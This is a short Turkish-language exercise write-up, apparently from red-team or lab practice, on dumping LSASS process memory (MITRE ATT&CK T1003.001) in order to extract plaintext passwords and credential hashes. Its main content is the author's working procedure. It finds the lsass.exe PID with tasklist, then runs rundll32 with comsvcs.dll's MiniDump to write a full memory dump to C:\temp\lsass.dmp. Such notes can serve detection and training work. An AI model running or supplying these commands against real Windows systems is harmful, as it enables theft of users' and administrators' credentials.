# LSASS Bellek Dökümü (Credential Access - T1003.001)

## Senaryo
Saldırgan, LSASS sürecinin belleğini kopyalayarak sistem belleğinden düz metin şifreleri ve kimlik bilgisi özetlerini (hash) çıkarmaya çalışır.

## Uygulama (Windows Komut Satırı)
`cmd.exe`'yi Yönetici (Administrator) olarak açtım. İlk olarak `tasklist` kullanarak `lsass.exe`'nin İşlem Kimliğini (PID) buldum. Ardından bellek dökümünü diske yazmak için `comsvcs.dll` içindeki `MiniDump` fonksiyonunu `rundll32.exe` ile tetikledim.

1. lsass.exe'nin PID değerini bul
```cmd
tasklist | findstr lsass.exe
```
2. LSASS belleğini kopyala (PID'nin 648 olduğu varsayılmıştır)
```cmd
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 648 C:\temp\lsass.dmp full
```

